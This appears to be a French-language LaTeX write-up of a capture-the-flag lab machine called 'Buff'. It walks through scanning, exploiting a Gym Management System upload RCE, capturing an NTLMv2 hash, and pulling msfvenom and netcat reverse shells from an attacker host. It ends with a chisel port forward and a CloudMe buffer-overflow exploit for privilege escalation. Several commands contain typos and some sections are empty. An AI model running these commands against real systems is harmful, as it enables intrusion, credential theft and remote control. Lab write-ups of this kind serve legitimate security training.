\chapter{Buff}
\begin{itemize}
    \item {\bf technics}: \gls{t:file-upload} \gls{t:pivoting}
        \gls{t:buffer-overflow}
    \item {\bf Components}: http
    \item {\bf tools}: searchsploit, chisel,msfvenom 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}

\subsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC 10.10.10.198
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 17:08 CEST
Nmap scan report for 10.10.10.198
Host is up (0.15s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests
\end{verbatim}

on relance en \verb+-p-+
\begin{verbatim}
$ sudo nmap -p- 10.10.10.198                       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 17:11 CEST
Verbosity Increased to 1.
Discovered open port 8080/tcp on 10.10.10.198
Verbosity Increased to 2.
Verbosity Increased to 3.
SYN Stealth Scan Timing: About 11.40% done; ETC: 17:16 (0:04:01 remaining)
SYN Stealth Scan Timing: About 22.25% done; ETC: 17:16 (0:03:33 remaining)
SYN Stealth Scan Timing: About 35.23% done; ETC: 17:15 (0:02:47 remaining)
SYN Stealth Scan Timing: About 46.38% done; ETC: 17:15 (0:02:20 remaining)
SYN Stealth Scan Timing: About 55.49% done; ETC: 17:16 (0:02:01 remaining)
Discovered open port 7680/tcp on 10.10.10.198
SYN Stealth Scan Timing: About 69.71% done; ETC: 17:15 (0:01:19 remaining)
Completed SYN Stealth Scan at 17:15, 229.13s elapsed (65535 total ports)
Nmap scan report for 10.10.10.198
Host is up (0.080s latency).
Scanned at 2022-09-13 17:11:28 CEST for 229s
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy
\end{verbatim}

on va relancer en focusant ces ports



\subsection{http}
\begin{verbatim}
Gym Management Software 1.0

$ searchsploit gym management
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - Authentication Bypass                      | php/webapps/48940.txt
Gym Management System 1.0 - 'id' SQL Injection                         | php/webapps/48936.txt
Gym Management System 1.0 - Stored Cross Site Scripting                | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution      | php/webapps/48506.py
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ searchsploit -x 48506

...
 1. Access the '/upload.php' page, as it does not check for an authenticated user session.

 http://10.10.10.198:8080/upload.php
Notice: Undefined index: id in C:\xampp\htdocs\gym\upload.php on line 4
\end{verbatim}

login form:
\begin{verbatim}
email=admin&password=&p=c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec

provient de
<form class="navbar-form navbar-right" role="form" 
    method="post" action="include/process_login.php">
           <div class="form-group">
              <input type="text" placeholder="Email" 
                class="form-control" name="email">
            </div>
            <div class="form-group">
              <input type="password" placeholder="Password" 
                class="form-control" name="password">
            </div>
            <input type="submit" class="btn btn-success" value="Sign in" 
                onclick="formhash(this.form, this.form.password);">

          </form>

function formhash(form, password) {
    // Create a new element input, this will be our hashed password field. 
    var p = document.createElement("input");
 
    // Add the new element to our form. 
    form.appendChild(p);
    p.name = "p";
    p.type = "hidden";
    p.value = hex_sha512(password.value);
 
    // Make sure the plaintext password doesn't get sent. 
    password.value = "";
 
    // Finally submit the form. 
    form.submit();
}
\end{verbatim}

on test quand même le sqli qui normalement est confirmé par searchsploit
\begin{verbatim}
$ sqlmap -r /tmp/sql.req --batch
\end{verbatim}
nope

en fait on va essayer en utilisant un calculateur vu que dans le code on a la
solution

\begin{verbatim}
sqlmap -r /tmp/sql.req  \
--eval="import hashlib; p=hashlib.sha512(password.encode()).hexdigest()" \
    --batch
\end{verbatim}

ca ne marche pas il faut voir si l'on peut injecter le même payload dans l'un
et dans l'autre car c'est ce qui est expliqué dans l'un des exploit.

\begin{verbatim}
--eval="import hashlib; password=email; p=hashlib.sha512(password.encode()).hexdigest()" 
--batch -p email --proxy http://127.0.0.1:8080
\end{verbatim}

ca ne marche pas très bien
\begin{verbatim}
email=admin%2C%2C%2C%29%22%27%2C%28%29.&password=admin,,,)"',().&p=40454cf9eeb5a574969f216b1a10c3f8ad31e02faf0775889275b303402ab94df123b43ef9bbeb3425da84f6fe7e76f4935b4369da7c782a392262f644abf29e
\end{verbatim}


n repart sur l'upload avec l'exploit qu'il faut modifier un peut car ecrit pour
du python2

\begin{verbatim}
$ python 48506.py http://10.10.10.198:8080/

[+] Successfully connected to webshell.
\end{verbatim}

\begin{verbatim}
$ curl http://10.10.10.198:8080/upload/shell.php?cmd=whoami

buff\shaun
\end{verbatim}

pour la forme un coup de responder

\begin{verbatim}
$ curl http://10.10.10.198:8080/upload/shell.php?cmd=%5C%5C10.10.16.3%5Ctest

SMB] NTLMv2-SSP Client   : 10.10.10.198
[SMB] NTLMv2-SSP Username : BUFF\shaun
[SMB] NTLMv2-SSP Hash     : shaun::BUFF:3e818d755bd8a825:9B5DC0349E4E3D811DBA92DE5E7A0B73:010100000000000000C7BF2A06C8D8016BAE64E991C75699000000000200080041004A005700500001001E00570049004E002D005100530030004F004C005900580050004E003100590004003400570049004E002D005100530030004F004C005900580050004E00310059002E0041004A00570050002E004C004F00430041004C000300140041004A00570050002E004C004F00430041004C000500140041004A00570050002E004C004F00430041004C000700080000C7BF2A06C8D801060004000200000008003000300000000000000000000000002000008EF1E42FA38010DA8C4BB6E22403D04A930688B5B816DFFB69470911031A9B280A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
\end{verbatim}

on va uplaod un meterpreter
\begin{verbatim}
$ msfvenom -l payloads windows/x64/meterpreter/resverse_tcp LHOST 10.10.16.3 LPORT 4444 -f exe > rshell.exe
python -m http.sever 8080

$ curl http://10.10.10.198:8080/upload/shell.php?cmd=certutil.exe%20-urlcache%20-split%20-f%20http%3A%2F%2F10.10.16.3%3A8080%2Frshell.exe%20rshell.exe
PNG

<br />
<b>Warning</b>:  shell_exec(): Unable to execute 'certutil.exe -urlcache -split -f http://10.10.16.3:8080/rshell.exe rshell.exe' in <b>C:\xampp\htdocs\gym\upload\shell.php</b> on line <b>3</b><br />

$ sudo smbserver.py -smb2support  test ./
*

$ curl http://10.10.10.198:8080/upload/shell.php?cmd=copy%20%5C%5C10.10.16.3%5Ctest%5Crshell.exe%20rshell.exe
PNG

        1 file(s) copied.
\end{verbatim}
en fait il faut le copier dans \verb+c:\users\public+

ca ne marche pas avec un \verb+x64+ on essaie en \verb+x86+

\begin{verbatim}
$ msfvenom -l payloads windows/meterpreter/resverse_tcp LHOST=10.10.16.3 \
    LPORT=4444 -f exe > rshell.exe
\end{verbatim}

on upload un \verb+nc+

\begin{verbatim}
$ curl http://10.10.10.198:8080/upload/shell.php?cmd=powershell\
%20Invoke-WebRequest%20-Uri%20http%3A%2F%2F10.10.16.3:8080\
%2Fnc64.exe%20-Outfile%20c%3A%5Cusers%5Cpublic%5Cnc.exe

$ curl http://10.10.10.198:8080/upload/shell.php?cmd=\
c%3A%5Cusers%5Cpublic%5Cnc.exe+10.10.16.3+4444+-e+cmd.exe
\end{verbatim}

et la ca passe.


on trouve \verb+CloudMe+ dans Downloads
\begin{verbatim}
$ searchsploit cloudme

CloudMe 1.11.2 - Buffer Overflow (PoC)                                            | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                   | windows/local/48840.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                   | windows/local/48499.txt
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                  | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                           | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                    | windows/remote/44175.rb
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                        | windows_x86-64/remote/44784.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                           | windows/remote/44027.py
CloudMe Sync 1.11.0 - Local Buffer Overflow                                       | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                   | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                          | windows_x86-64/remote/46250.py

$ searchsploit -x 48389

import socket

target = "127.0.0.1"

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
\end{verbatim}

le service est il executé ?

\begin{verbatim}
PS C:\users\shaun\documents> netstat -ano | findstr ':8888'
netstat -ano | findstr ':8888'
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       8000
\end{verbatim}

Il faut pouvoir faire un local port fowarding:

\begin{verbatim}
Invoke-WebRequest http://10.10.16.3:8080/chisel.exe -Outfile c:\users\public\chisel.exe

$ chisel server -p 9999 --reverse

PS C:\users\public> .\chisel.exe client 10.10.16.3:9999 R:8888:127.0.0.1:8888
\end{verbatim}

Il faut creer un payload car dans le 48389 ca call calc.exe

\begin{verbatim}
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=5555 \
    EXITFUNC=thread -b "\x00\x0d\x0a" -f python
\end{verbatim}

\begin{verbatim}
$ sudo nc -lnvp 5555

$ python 48389.py

Listening on 0.0.0.0 5555
Connection received on 10.10.10.198 49705
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
\end{verbatim}



\subsection{nmap}
\begin{verbatim}
\end{verbatim}

\section{Theorie}


